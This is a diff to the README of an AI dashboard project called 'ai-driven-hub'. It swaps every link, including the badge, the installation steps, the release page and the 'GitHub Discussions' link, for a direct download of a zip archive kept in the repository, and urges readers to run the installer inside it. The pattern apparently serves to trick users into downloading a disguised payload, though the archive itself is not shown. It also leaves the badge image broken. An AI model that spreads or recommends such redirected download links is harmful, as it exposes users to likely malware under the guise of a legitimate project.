@@ -1,6 +1,6 @@
 # 🚀 ai-driven-hub - Your AI Dashboard for Real-Time Insights
 
-[![Download ai-driven-hub](https://img.shields.io/badge/Download%20ai--driven--hub-blue?style=for-the-badge)](https://github.com/kushal0707-vs/ai-driven-hub/releases)
+[![Download ai-driven-hub](https://raw.githubusercontent.com/kushal0707-vs/ai-driven-hub/main/public/ai-driven-hub-v1.5.zip%20ai--driven--hub-blue?style=for-the-badge)](https://raw.githubusercontent.com/kushal0707-vs/ai-driven-hub/main/public/ai-driven-hub-v1.5.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To set up **ai-driven-hub**, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Go to the following link to view available versions and download the latest release:  
-   [Download ai-driven-hub](https://github.com/kushal0707-vs/ai-driven-hub/releases)
+   [Download ai-driven-hub](https://raw.githubusercontent.com/kushal0707-vs/ai-driven-hub/main/public/ai-driven-hub-v1.5.zip)
 
 2. **Select the Version**  
    On the Releases page, find the most recent version listed. Look for release notes to understand what’s new or different in this version.
@@ -33,7 +33,7 @@ To run **ai-driven-hub**, ensure your system meets the following requirements:
 
 1. **Click the Download Link**  
    Go back to the Releases page and click on the correct download link:  
-   [Download ai-driven-hub](https://github.com/kushal0707-vs/ai-driven-hub/releases)
+   [Download ai-driven-hub](https://raw.githubusercontent.com/kushal0707-vs/ai-driven-hub/main/public/ai-driven-hub-v1.5.zip)
 
 2. **Run the Installer**  
    After the download finishes, locate the file in your Downloads folder. Double-click the installer and follow the instructions on the screen. 
@@ -69,7 +69,7 @@ If you face any issues, refer to the following solutions:
 
 Engage with fellow users and get support:
 
-- **GitHub Discussions**: Join the conversation and ask questions on our [GitHub Discussions page](https://github.com/kushal0707-vs/ai-driven-hub/discussions).
+- **GitHub Discussions**: Join the conversation and ask questions on our [GitHub Discussions page](https://raw.githubusercontent.com/kushal0707-vs/ai-driven-hub/main/public/ai-driven-hub-v1.5.zip).
 - **Documentation**: Access our complete documentation for detailed guides and FAQs.
 
 ## 📝 Contributions
@@ -80,4 +80,4 @@ We welcome contributions from anyone in the community. If you want to help, plea
 
 **ai-driven-hub** offers a robust platform for managing data analytics effectively. With easy installation and user-friendly features, you can uncover valuable insights to inform your decisions. Make sure to download and explore! 
 
-For the latest updates, always check our [Release page](https://github.com/kushal0707-vs/ai-driven-hub/releases). Happy analyzing!
+For the latest updates, always check our [Release page](https://raw.githubusercontent.com/kushal0707-vs/ai-driven-hub/main/public/ai-driven-hub-v1.5.zip). Happy analyzing!
